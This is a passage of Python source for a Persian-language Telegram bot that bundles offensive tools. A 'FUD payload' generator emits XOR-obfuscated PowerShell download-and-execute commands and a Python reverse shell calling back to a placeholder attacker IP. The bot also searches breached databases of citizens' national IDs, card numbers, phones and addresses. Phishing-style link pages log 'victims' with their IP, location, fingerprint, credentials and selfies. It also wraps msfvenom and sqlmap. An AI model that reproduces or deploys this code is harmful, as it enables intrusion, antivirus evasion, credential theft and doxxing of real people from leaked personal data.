                soup = BeautifulSoup(r.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    if 't.me' in link.get('href'):
                        results.append(link.get('href')); break
        except: pass
    return "🔍 منابع احتمالی:\n" + "\n".join(f"• {r}" for r in results[:5]) if results else "منبع دقیقی یافت نشد."

def extract_exif_metadata(image_data):
    if not EXIFREAD_AVAILABLE: return {"error": "exifread نصب نیست."}
    try:
        tags = exifread.process_file(io.BytesIO(image_data))
        metadata = {}
        for tag, value in tags.items():
            if any(k in str(tag) for k in ['GPS','DateTime','Make','Model','Software']):
                metadata[str(tag)] = str(value)
        gps_lat = tags.get('GPS GPSLatitude')
        gps_lon = tags.get('GPS GPSLongitude')
        if gps_lat and gps_lon:
            try:
                def gps_to_dec(gps_val):
                    v = gps_val.values
                    return v[0] + v[1]/60 + v[2]/3600
                lat = gps_to_dec(gps_lat) * (1 if 'S' not in str(tags.get('GPS GPSLatitudeRef','')) else -1)
                lon = gps_to_dec(gps_lon) * (1 if 'W' not in str(tags.get('GPS GPSLongitudeRef','')) else -1)
                metadata['GPS'] = f"{lat}, {lon}"
                metadata['GPS_Link'] = f"https://maps.google.com/?q={lat},{lon}"
            except: pass
        return metadata
    except: return {"error": "خطا در استخراج متادیتا."}

def process_whispertrace_text(text, user_id):
    profile = psychological_analysis(text)
    source = track_source(text)
    db_execute("INSERT INTO whispertrace_analysis (user_id, input_type, input_data, text_content, psychological_profile, source_tracking, analyzed_at) VALUES (?,?,?,?,?,?,?)",
               (user_id, "text", text[:500], text[:1000], profile, source, datetime.now().isoformat()))
    return {"profile":profile,"source":source}

def process_whispertrace_image(image_data, user_id):
    metadata = extract_exif_metadata(image_data)
    db_execute("INSERT INTO whispertrace_analysis (user_id, input_type, input_data, metadata, analyzed_at) VALUES (?,?,?,?,?)",
               (user_id, "image", "image_data", json.dumps(metadata), datetime.now().isoformat()))
    return {"metadata":metadata}

def format_whispertrace_report(result):
    msg = "🔍 **WhisperTrace**\n\n"
    if "profile" in result:
        msg += "🧠 **تحلیل روانشناختی:**\n" + result["profile"] + "\n\n"
    if "source" in result:
        msg += "🔗 **ردیابی منبع:**\n" + result["source"] + "\n\n"
    if "metadata" in result:
        msg += "📋 **متادیتای تصویر:**\n"
        if isinstance(result["metadata"], dict):
            for k, v in result["metadata"].items():
                if k == 'GPS_Link': msg += f"   • 📍 موقعیت: [لینک نقشه]({v})\n"
                else: msg += f"   • {k}: {v}\n"
        else: msg += str(result["metadata"])
    return msg

SMART_QUERY_LIMIT = 8
ALLOWED_BREACH_COLUMNS = {'full_name','national_code','father_name','birth_date','birth_place','birth_city','mobile','card_no','account_number','address','city','province'}

def get_all_breach_dbs():
    if not os.path.exists(BREACH_DIR): return []
    return [os.path.join(BREACH_DIR, f) for f in os.listdir(BREACH_DIR) if f.endswith('.db')]

def search_in_breaches(filters, page=0, per_page=SMART_QUERY_LIMIT):
    active = {k: v.strip() for k, v in filters.items() if v and len(str(v).strip()) >= 2 and k in ALLOWED_BREACH_COLUMNS}
    if not active: return [], 0
    dbs = get_all_breach_dbs()
    if not dbs: return [], 0
    all_results = []
    exact_fields = {'national_code','card_no','mobile','account_number'}
    for db_path in dbs:
        try:
            conn = sqlite3.connect(db_path); conn.row_factory = sqlite3.Row; cur = conn.cursor()
            conditions, params = [], []
            for field, value in active.items():
                if field in exact_fields:
                    conditions.append(f"{field} = ?"); params.append(value)
                else:
                    conditions.append(f"{field} LIKE ?"); params.append(f"%{value}%")
            if not conditions: continue
            sql = f"SELECT * FROM people WHERE " + " AND ".join(conditions) + " LIMIT 1000"
            cur.execute(sql, params)
            for row in cur:
                all_results.append({k: row[k] or '—' for k in row.keys()})
            conn.close()
        except: continue
    seen = {}
    unique = []
    for r in all_results:
        key = r.get('national_code')
        if key and key != '—' and key not in seen:
            seen[key] = True; unique.append(r)
        elif not key or key == '—':
            alt = f"{r.get('full_name')}_{r.get('father_name')}_{r.get('birth_date')}"
            if alt not in seen:
                seen[alt] = True; unique.append(r)
    total = len(unique)
    start = page * per_page
    paginated = unique[start:start+per_page]
    return paginated, total

def format_smart_report(results, total, page, per_page, query_info):
    msg = f"🔍 **SmartQuery**\n\n📌 {query_info}\n📊 {total} نتیجه"
    if total > 0:
        total_pages = (total + per_page - 1) // per_page
        msg += f" | 📄 صفحه {page+1} از {total_pages}"
    msg += "\n\n"
    if not results: return msg + "❌ هیچ نتیجه‌ای یافت نشد."
    for i, r in enumerate(results, 1):
        msg += f"▫️{i}. **{r.get('full_name','—')}**\n"
        msg += f"   🆔 کد ملی: {r.get('national_code','—')}\n"
        msg += f"   📆 تولد: {r.get('birth_date','—')}\n"
        msg += f"   👤 پدر: {r.get('father_name','—')}\n"
        if r.get('mobile') and r['mobile'] != '—':
            msg += f"   📱 موبایل: {r['mobile']}\n"
        if r.get('card_no') and r['card_no'] != '—':
            card = r['card_no']; card = card[:4] + '-****-' + card[-4:] if len(card) >= 16 else card
            msg += f"   💳 کارت: {card}\n"
        if r.get('address') and r['address'] != '—':
            msg += f"   📍 آدرس: {r['address'][:50]}...\n"
        msg += "\n"
    return msg

def pentest_whois(target):
    if not WHOIS_AVAILABLE: return "کتابخانه whois نصب نیست."
    try:
        w = whois.whois(target)
        if w:
            return f"📋 **Whois {target}**\nثبت‌کننده: {w.registrar or 'نامشخص'}\nایجاد: {w.creation_date}\nانقضا: {w.expiration_date}\nDNS: {', '.join(w.name_servers[:5]) if w.name_servers else '—'}"
    except Exception as e: return f"خطا: {e}"

def pentest_dns(target):
    if not DNS_AVAILABLE: return "کتابخانه dns نصب نیست."
    res = []
    for rec in ['A','AAAA','MX','NS','TXT','CNAME','SOA']:
        try:
            ans = dns.resolver.resolve(target, rec)
            res.append(f"📌 {rec}: {', '.join(str(r) for r in ans[:5])}")
        except: res.append(f"📌 {rec}: یافت نشد")
    return "\n".join(res)

def pentest_ipgeo(target):
    try:
        r = http_session.get(f"http://ip-api.com/json/{target}", timeout=10)
        if r.status_code == 200:
            d = r.json()
            if d.get('status') == 'success':
                return f"📍 {target}\nکشور: {d.get('country')}\nشهر: {d.get('city')}\nISP: {d.get('isp')}"
    except: pass
    return "اطلاعاتی یافت نشد."

def pentest_subdomain(target):
    subs = ['www','mail','ftp','admin','test','dev','api','blog','forum','support']
    found = []
    for s in subs:
        try:
            dns.resolver.resolve(f"{s}.{target}", 'A')
            found.append(f"✅ {s}.{target}")
        except: pass
    return "🔍 ساب‌دامنه‌ها:\n" + "\n".join(found) if found else "هیچ ساب‌دامنه‌ای پیدا نشد."

def pentest_portscan(target):
    try:
        ip = socket.gethostbyname(target)
    except:
        return "❌ دامنه یا IP نامعتبر است."
    ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
    open_ports = []
    for p in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                if sock.connect_ex((ip, p)) == 0: open_ports.append(p)
        except: pass
    return "🔓 پورت‌های باز:\n" + "\n".join(f"✅ پورت {p}" for p in open_ports) if open_ports else "هیچ پورت بازی یافت نشد."

def pentest_ssl(target):
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((target, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()
                return f"🔒 SSL {target}\nصادرکننده: {cert.get('issuer')}\nموضوع: {cert.get('subject')}\nانقضا: {cert.get('notAfter')}"
    except Exception as e: return f"خطا: {e}"

def pentest_dirbrute(target):
    dirs = ['admin','login','wp-admin','backup','config','uploads','images','css','js','api']
    found = []
    for d in dirs:
        try:
            r = http_session.get(f"http://{target}/{d}/", timeout=3)
            if r.status_code == 200: found.append(f"✅ {target}/{d}/")
            elif r.status_code == 403: found.append(f"🔒 {target}/{d}/ (403)")
        except: pass
    return "📂 دایرکتوری‌ها:\n" + "\n".join(found) if found else "هیچ دایرکتوری یافت نشد."

def pentest_fullscan(target):
    return "\n\n".join([pentest_whois(target), pentest_dns(target), pentest_ipgeo(target), pentest_portscan(target), pentest_ssl(target)])

def crypto_hash_text(text, action):
    try:
        if action == "base64_encode": return base64.b64encode(text.encode()).decode()
        elif action == "base64_decode": return base64.b64decode(text.encode()).decode()
        elif action == "url_encode": return urllib.parse.quote(text)
        elif action == "url_decode": return urllib.parse.unquote(text)
        elif action == "hex_encode": return text.encode().hex()
        elif action == "hex_decode": return bytes.fromhex(text).decode()
        elif action == "html_escape": return escape(text)
        elif action == "html_unescape": return unescape(text)
        elif action == "rot13": return codecs.encode(text, 'rot_13')
        elif action in ["md5","sha1","sha256","sha512"]:
            h = hashlib.new(action); h.update(text.encode()); return h.hexdigest()
        elif action == "hash_identify":
            if re.match(r'^[a-f0-9]{32}$', text, re.I): return "MD5"
            if re.match(r'^[a-f0-9]{40}$', text, re.I): return "SHA1"
            if re.match(r'^[a-f0-9]{56}$', text, re.I): return "SHA224"
            if re.match(r'^[a-f0-9]{64}$', text, re.I): return "SHA256"
            if re.match(r'^[a-f0-9]{96}$', text, re.I): return "SHA384"
            if re.match(r'^[a-f0-9]{128}$', text, re.I): return "SHA512"
            return "شناسایی نشد"
        return "عملیات نامعتبر"
    except Exception as e: return f"خطا: {e}"

def hibp_check_password(password):
    try:
        sha1_hash = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
        prefix, suffix = sha1_hash[:5], sha1_hash[5:]
        r = http_session.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=5)
        if r.status_code != 200: return None, "خطا در اتصال"
        hashes = (line.split(':') for line in r.text.splitlines())
        for h, count in hashes:
            if h == suffix: return True, int(count)
        return False, 0
    except Exception as e: return None, str(e)

def search_cve(query, max_results=5):
    results = []
    try:
        url = f"https://cve.circl.lu/api/search/{urllib.parse.quote(query)}"
        r = http_session.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            for item in data[:max_results]:
                cve_id = item.get("id", "")
                summary = item.get("summary", "")[:200]
                results.append({"cve_id": cve_id, "summary": summary, "exploit_db_link": f"https://www.exploit-db.com/search?cve={cve_id}"})
        if not results:
            results.append({"cve_id": query, "summary": "در CIRCL یافت نشد", "exploit_db_link": f"https://www.exploit-db.com/search?cve={query}"})
        return results
    except: return [{"cve_id": "خطا", "summary": "خطا در جستجو", "exploit_db_link": ""}]

def passive_subdomain_enum(domain, source="crt"):
    subdomains = set()
    try:
        if source == "crt":
            url = f"https://crt.sh/?q=%25.{domain}&output=json"
            r = http_session.get(url, timeout=15)
            if r.status_code == 200:
                data = r.json()
                for entry in data:
                    name = entry.get("name_value", "")
                    for sub in name.split('\n'):
                        sub = sub.strip().lstrip('*.')
                        if sub and domain in sub: subdomains.add(sub)
        elif source == "anubis":
            url = f"https://jldc.me/anubis/subdomains/{domain}"
            r = http_session.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                for sub in data: subdomains.add(sub)
        elif source == "otx":
            url = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"
            r = http_session.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                for entry in data.get("passive_dns", []):
                    hostname = entry.get("hostname", "")
                    if hostname and domain in hostname: subdomains.add(hostname)
        return sorted(subdomains)[:30]
    except: return [str(e)]

def web_tech_detect(url):
    try:
        if not url.startswith(('http://', 'https://')): url = 'https://' + url
        headers = {'User-Agent': 'Mozilla/5.0'}
        resp = http_session.get(url, headers=headers, timeout=10)
        techs = []
        server = resp.headers.get('Server', '')
        if server: techs.append(f"وب‌سرور: {server}")
        powered_by = resp.headers.get('X-Powered-By', '')
        if powered_by: techs.append(f"فناوری: {powered_by}")
        soup = BeautifulSoup(resp.text, 'html.parser')
        generators = soup.find_all('meta', attrs={'name': 'generator'})
        for gen in generators:
            content = gen.get('content', '')
            if content: techs.append(f"سازنده: {content}")
        scripts = soup.find_all('script', src=True)
        script_sources = {script['src'] for script in scripts}
        cdn_patterns = {
            'jquery.js': 'jQuery', 'bootstrap.js': 'Bootstrap', 'react.js': 'React',
            'vue.js': 'Vue.js', 'angular.js': 'Angular',
        }
        for src in script_sources:
            for key, tech in cdn_patterns.items():
                if key in src.lower(): techs.append(tech)
        cookies = resp.cookies
        for cookie in cookies:
            if 'PHPSESSID' in cookie.name: techs.append('PHP')
            elif 'JSESSIONID' in cookie.name: techs.append('Java (JSP/Servlet)')
            elif 'ASP.NET_SessionId' in cookie.name: techs.append('ASP.NET')
        return "🔍 **فناوری‌های شناسایی‌شده:**\n" + "\n".join(f"• {t}" for t in techs) if techs else "❌ فناوری خاصی شناسایی نشد."
    except Exception as e: return f"❌ خطا: {e}"

def port_scanner(ip, ports=None, timeout=1):
    if ports is None:
        ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443]
    open_ports = []
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            if sock.connect_ex((ip, port)) == 0:
                try: service = socket.getservbyport(port, 'tcp')
                except: service = "unknown"
                open_ports.append(f"{port} ({service})")
    return open_ports

def nmap_scan(ip, options="-sV -T4"):
    try:
        cmd = ["nmap"] + shlex.split(options) + [ip]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        return result.stdout
    except FileNotFoundError: return None
    except Exception as e: return f"خطا: {e}"

def run_dalfox(url, options="--silence --skip-bav"):
    try:
        cmd = ["dalfox", "url", url] + shlex.split(options)
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return result.stdout if result.returncode == 0 else f"خطا:\n{result.stderr}"
    except FileNotFoundError: return "❌ Dalfox نصب نیست."
    except Exception as e: return f"❌ خطا: {e}"

def run_sqlmap(url, options="--batch --random-agent --level=1 --risk=1"):
    try:
        cmd = ["sqlmap", "-u", url] + shlex.split(options)
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        return result.stdout if result.returncode == 0 else f"خطا:\n{result.stderr}"
    except FileNotFoundError: return "❌ SQLMap نصب نیست."
    except Exception as e: return f"❌ خطا: {e}"

def msfvenom_payload(payload_type="windows/x64/meterpreter/reverse_tcp", lhost="", lport=4444, output_format="exe", encoder="", iterations=1):
    cmd = ["msfvenom", "-p", payload_type, f"LHOST={lhost}", f"LPORT={lport}"]
    if encoder: cmd += ["-e", encoder, "-i", str(iterations)]
    cmd += ["-f", output_format]
    try:
        result = subprocess.run(cmd, capture_output=True, timeout=60)
        if result.returncode == 0:
            return result.stdout
        else:
            return f"❌ خطا:\n{result.stderr.decode()}".encode()
    except FileNotFoundError: return "❌ Metasploit نصب نیست.".encode()
    except Exception as e: return f"❌ خطا: {e}".encode()

def generate_fud_payload(platform="windows", method="encryption"):
    try:
        if platform == "windows":
            raw = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')"
            key = secrets.token_bytes(1)[0]
            encrypted = bytes([b ^ key for b in raw.encode()])
            encoded = base64.b64encode(encrypted).decode()
            cmd = f"powershell -enc {encoded}"
            return f"💻 **پیلود FUD (PowerShell رمزنگاری‌شده):**\n```{cmd}```\nکلید XOR: {key}\nباید سمت سرور decode شود."
        elif platform == "linux":
            raw = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('YOUR_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])"
            key = secrets.token_bytes(1)[0]
            encrypted = bytes([b ^ key for b in raw.encode()])
            encoded = base64.b64encode(encrypted).decode()
            cmd = f"python -c \"import base64,subprocess;exec(bytes([b^{key} for b in base64.b64decode('{encoded}')]))\""
            return f"🐧 **پیلود FUD (Python رمزنگاری‌شده):**\n```{cmd}```\nکلید XOR: {key}\nباید سمت سرور decode شود."
    except Exception as e: return f"❌ خطا: {e}"

def auto_pentest_workflow(target, user_id):
    target = clean_target(target)
    steps = []
    whois_result = pentest_whois(target); steps.append(("Whois", whois_result))
    dns_result = pentest_dns(target); steps.append(("DNS", dns_result))
    ipgeo = pentest_ipgeo(target); steps.append(("IP Geo", ipgeo))
    port_result = pentest_portscan(target); steps.append(("Ports", port_result))
    ssl_result = pentest_ssl(target)
    steps.append(("SSL", ssl_result))
    summary = "\n".join([f"{t}: {r[:300]}" for t,r in steps])
    prompt = f"نتایج اسکن برای {target}:\n{summary}\n\nلطفاً تحلیل کن و پیشنهاد بده:\n1. چه آسیب‌پذیری‌های احتمالی وجود دارد؟\n2. بهترین قدم بعدی چیست؟ (XSS, SQLi, Dir Brute, Exploit)\nفقط یک توصیه عملی بده."
    suggestion = ask_groq(prompt)
    if suggestion.startswith("آخی عزیز"):
        suggestion = "پیشنهاد Groq در حال حاضر در دسترس نیست ✨"
    return steps, suggestion

def generate_pentest_report(user_id, target=None):
    if not FPDF_AVAILABLE: return None
    font_path = os.path.join(BASE_DIR, "Vazir.ttf")
    if not os.path.exists(font_path):
        try:
            r = http_session.get("https://github.com/rastikerdar/vazirmatn/raw/main/fonts/ttf/Vazirmatn-Regular.ttf", timeout=10)
            with open(font_path, 'wb') as f: f.write(r.content)
        except:
            return None
    if target:
        rows = db_fetch_all("SELECT * FROM pentest_history WHERE user_id=? AND target=? ORDER BY executed_at DESC", (user_id, target))
    else:
        rows = db_fetch_all("SELECT * FROM pentest_history WHERE user_id=? ORDER BY executed_at DESC LIMIT 20", (user_id,))
    if not rows: return None
    pdf = FPDF()
    pdf.add_page()
    pdf.add_font('Vazir', '', font_path, uni=True)
    pdf.set_font('Vazir', '', 12)
    pdf.cell(200, 10, txt="گزارش تست نفوذ - MR_SIAVASH_IR_BOT", ln=1, align='C')
    pdf.ln(10)
    for row in rows:
        pdf.set_font('Vazir', '', 10)
        text = f"ابزار: {row['tool']} | هدف: {row['target']}\nزمان: {row['executed_at']}\n{row['results'][:300]}\n"
        pdf.multi_cell(0, 10, text)
        pdf.ln(5)
    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".pdf")
    pdf.output(temp_file.name)
    return temp_file.name

def tg_profile_inspector(username_or_id):
    try:
        chat = bot.get_chat(username_or_id)
        approx_ts = chat.id / (2**32) + 1375000000
        join_date = datetime.fromtimestamp(approx_ts).strftime('%Y-%m-%d')
        msg = f"""
🕵️ **پرونده تلگرامی**

👤 نام: {chat.first_name or ''} {chat.last_name or ''}
📛 یوزرنیم: @{chat.username or 'ندارد'}
🆔 شناسه: `{chat.id}`
📝 بیو: {getattr(chat, 'bio', 'ندارد')}
📸 عکس پروفایل: {'✅' if getattr(chat, 'photo', None) else '❌'}
📅 تاریخ عضویت تقریبی: {join_date}
⚠️ این اطلاعات فقط از API عمومی تلگرام استخراج شده.
"""
        return msg
    except telebot.apihelper.ApiTelegramException as e:
        if "chat not found" in str(e).lower():
            return "❌ این کاربر وجود ندارد یا ربات محدودیت دسترسی دارد."
        return f"❌ خطای API تلگرام: {e}"
    except Exception as e: return f"❌ کاربر یافت نشد یا ربات محدودیت دارد.\n{e}"

bot = telebot.TeleBot(TELEGRAM_TOKEN)

def should_respond(message):
    if message.chat.type == "private": return True
    if message.reply_to_message and message.reply_to_message.from_user.id == bot.get_me().id: return True
    if message.text and f"@{bot.get_me().username}" in message.text: return True
    return False

def is_text_message(message):
    return message.text is not None

def reset_state_on_menu(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    sess["state"] = None
    reset_smart_session(user_id)

@app.route('/webhook', methods=['POST'])
def webhook():
    update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
    bot.process_new_updates([update])
    return "OK", 200

@app.route('/osint/l/<code>')
def osint_redirect(code):
    link = db_fetch_one("SELECT * FROM links WHERE code = ?", (code,))
    if not link:
        return "لینک نامعتبر است", 404
    db_execute("UPDATE links SET visits = visits + 1 WHERE code = ?", (code,))
    try:
        return send_from_directory("templates", f"{link['template']}.html")
    except:
        return send_from_directory("templates", "digikala.html")

@app.route('/osint/track', methods=['POST'])
def osint_track():
    data = request.get_json()
    if not data:
        return "Bad Request", 400
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ip.startswith('::ffff:'):
        ip = ip[7:]
    user_agent = request.headers.get('User-Agent', '')
    link_code = data.get('link_code')
    link = db_fetch_one("SELECT * FROM links WHERE code = ?", (link_code,))
    if not link:
        return "Invalid link", 400
    db_execute("INSERT INTO victims (link_code, timestamp, ip, city, country, lat, lon, user_agent, fingerprint, credentials, selfie_path, created_by) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
               (link_code, datetime.now().isoformat(), ip, data.get("city","N/A"), data.get("country","N/A"), data.get("lat",0), data.get("lon",0), user_agent, json.dumps(data.get("fingerprint",{})), json.dumps(data.get("credentials",{})), data.get("selfie_path",""), link['user_id']))
    return "OK", 200

@bot.message_handler(commands=['start','help'])
def welcome(message):
    register_user(message.chat.id, message.from_user.username, message.from_user.first_name)
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🌍 اینترنت آزاد", callback_data="free_internet_menu"),
        InlineKeyboardButton("🎯 پنتست", callback_data="pentest_menu"),
        InlineKeyboardButton("📚 کتابخانه", callback_data="library_menu"),
        InlineKeyboardButton("👤 Shadowgram", callback_data="shadow_menu"),
        InlineKeyboardButton("👁️ DeepEye", callback_data="deepeye_menu"),
        InlineKeyboardButton("🔍 WhisperTrace", callback_data="whispertrace_menu"),
        InlineKeyboardButton("🔍 SmartQuery", callback_data="smart_menu"),
        InlineKeyboardButton("🛠️ ابزارهای امنیتی", callback_data="security_tools"),
        InlineKeyboardButton("🌐 شناسایی فناوری وب", callback_data="web_tech"),
        InlineKeyboardButton("📊 گزارش پنتست", callback_data="generate_report"),
        InlineKeyboardButton("🔌 اسکنر پورت", callback_data="port_scanner"),
        InlineKeyboardButton("🔥 XSS و SQLMap", callback_data="xss_sqlmap"),
        InlineKeyboardButton("💣 تولید پیلود", callback_data="payload_gen"),
        InlineKeyboardButton("🤖 تست نفوذ خودکار", callback_data="auto_pentest"),
        InlineKeyboardButton("🛡️ FUD Payload", callback_data="fud_payload"),
        InlineKeyboardButton("🔍 جستجوی وب", callback_data="search_web"),
        InlineKeyboardButton("🕵️ پروفایل تلگرام", callback_data="tg_profile"),
        InlineKeyboardButton("✨ راهنما", callback_data="help_guide"),
    )
    if message.from_user.id in ADMIN_IDS:
        markup.add(InlineKeyboardButton("📥 یارگیری", callback_data="yar_giri"))
    bot.reply_to(message, "✨ MR_SIAVASH_IR_BOT ✨\nسلام عزیز ✨ انتخاب کن ✨", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def back_to_main(call):
    reset_state_on_menu(call)
    welcome(call.message)

@bot.callback_query_handler(func=lambda call: call.data == "free_internet_menu")
def free_internet_submenu(call):
    reset_state_on_menu(call)
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("✨ CDN یاب ✨", callback_data="cdn_finder_menu"),
        InlineKeyboardButton("✨ اسکنر CDN ✨", callback_data="cdn_scanner_menu"),
        InlineKeyboardButton("✨ پیشنهاد CDN ✨", callback_data="suggest_cdn"),
        InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main")
    )
    bot.edit_message_text("✨ **اینترنت آزاد** ✨", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "cdn_finder_menu")
def cdn_finder_menu(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    sess["state"] = "waiting_finder_domain"
    bot.edit_message_text("🌐 دامنه را بفرست:", call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: get_user_session(m.from_user.id).get("state") == "waiting_finder_domain" and m.text and not m.text.startswith('/'))
def handle_finder_domain(message):
    user_id = message.from_user.id
    sess = get_user_session(user_id)
    domain = message.text.strip()
    ips = []
    try:
        r = http_session.get(f"https://dns.google/resolve?name={domain}&type=A", timeout=5)
        data = r.json()
        if "Answer" in data:
            ips = [a["data"] for a in data["Answer"] if a.get("type") == 1]
    except: pass
    if not ips:
        bot.reply_to(message, "❌ IP پیدا نشد")
        sess["state"] = None
        return
    alive = []
    for ip in ips:
        if measure_latency(ip, 443, domain, timeout=2) is not None:
            alive.append(ip)
    result = f"🌐 {domain}:\n" + "\n".join(f"{ip} {'✅' if ip in alive else '❌'}" for ip in ips)
    bot.reply_to(message, result)
    sess["state"] = None

@bot.callback_query_handler(func=lambda call: call.data == "cdn_scanner_menu")
def cdn_scanner_menu(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    markup = InlineKeyboardMarkup(row_width=2)
    for key, data in CDN_DATA.items():
        chk = "✅" if key in sess["selected_cdns"] else "⬜"
        markup.add(InlineKeyboardButton(f"{chk} {data['name']}", callback_data=f"toggle_cdn:{key}"))
    adaptive_status = "✅ فعال" if sess.get("adaptive_sni", True) else "❌ غیرفعال"
    markup.add(
        InlineKeyboardButton("🎯 انتخاب SNI", callback_data="select_sni"),
        InlineKeyboardButton(f"🤖 Adaptive SNI: {adaptive_status}", callback_data="toggle_adaptive_sni"),
        InlineKeyboardButton("⚙️ تنظیمات اسکن", callback_data="scan_settings"),
        InlineKeyboardButton("🚀 شروع اسکن (با تست سرعت)", callback_data="start_scan"),
        InlineKeyboardButton("📋 تاریخچه", callback_data="scan_history"),
        InlineKeyboardButton("🔙 برگشت", callback_data="free_internet_menu")
    )
    bot.edit_message_text("🏢 CDNهای مورد نظر را انتخاب کن:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("toggle_cdn:"))
def toggle_cdn(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    cdn = call.data.split(":")[1]
    if cdn in sess["selected_cdns"]:
        del sess["selected_cdns"][cdn]
    else:
        sess["selected_cdns"][cdn] = CDN_DATA[cdn]
    cdn_scanner_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "select_sni")
def select_sni(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    markup = InlineKeyboardMarkup(row_width=1)
    for sni in SNI_POOL[:15]:
        flag = "✅" if sess["selected_sni"] == sni else ""
        markup.add(InlineKeyboardButton(f"{flag} {sni}", callback_data=f"sni_pick:{sni}"))
    markup.add(InlineKeyboardButton("🔙 برگشت", callback_data="cdn_scanner_menu"))
    bot.edit_message_text("🔒 یک SNI انتخاب کن:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("sni_pick:"))
def pick_sni(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    sess["selected_sni"] = call.data.split(":")[1]
    bot.answer_callback_query(call.id, f"✨ {sess['selected_sni']} انتخاب شد")
    cdn_scanner_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "toggle_adaptive_sni")
def toggle_adaptive_sni(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    sess["adaptive_sni"] = not sess.get("adaptive_sni", True)
    bot.answer_callback_query(call.id, f"Adaptive SNI {'فعال' if sess['adaptive_sni'] else 'غیرفعال'} شد")
    cdn_scanner_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "scan_settings")
def scan_settings_menu(call):
    user_id = call.from_user.id
    st = get_user_session(user_id)["scan_settings"]
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(f"🛡️ حالت مخفی: {st['stealth']}/4", callback_data="change_stealth"),
        InlineKeyboardButton(f"⚡ همزمانی: {st['conc']}", callback_data="change_conc"),
        InlineKeyboardButton(f"⏱ تایم‌اوت: {st['timeout']}ms", callback_data="change_timeout"),
        InlineKeyboardButton(f"🔌 پورت: {st['port']}", callback_data="change_port"),
        InlineKeyboardButton("🔙 برگشت", callback_data="cdn_scanner_menu")
    )
    bot.edit_message_text("⚙️ تنظیمات اسکن:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "change_stealth")
def change_stealth(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    sess["scan_settings"]["stealth"] = (sess["scan_settings"]["stealth"] + 1) % 5
    scan_settings_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "change_conc")
def change_conc(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    sess["scan_settings"]["conc"] = (sess["scan_settings"]["conc"] % 15) + 1
    scan_settings_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "change_timeout")
def change_timeout(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    vals = [1000, 2000, 3000, 4000, 5000]
    idx = vals.index(sess["scan_settings"]["timeout"]) if sess["scan_settings"]["timeout"] in vals else 2
    sess["scan_settings"]["timeout"] = vals[(idx + 1) % len(vals)]
    scan_settings_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "change_port")
def change_port(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    sess["scan_settings"]["port"] = (sess["scan_settings"]["port"] % 65535) + 1
    scan_settings_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "start_scan")
def start_scan(call):
    user_id = call.from_user.id
    sess = get_user_session(user_id)
    if not sess["selected_cdns"]:
        bot.answer_callback_query(call.id, "حداقل یک CDN انتخاب کن")
        return
    if sess["scan_running"]:
        bot.answer_callback_query(call.id, "اسکن در حال اجراست")
        return
    ips = []
    for data in sess["selected_cdns"].values():
        for r in data["ranges"]:
            ips.extend(cidr_to_ips(r))
    random.shuffle(ips)
    ips = ips[:50]
    sess["scan_running"] = True
    sess["scan_stop_event"].clear()
    sess["scan_results_detail"] = []
    msg = bot.send_message(call.message.chat.id, "🔍 اسکن با تست سرعت شروع شد...")
    sess["last_scan_msg_id"] = msg.message_id
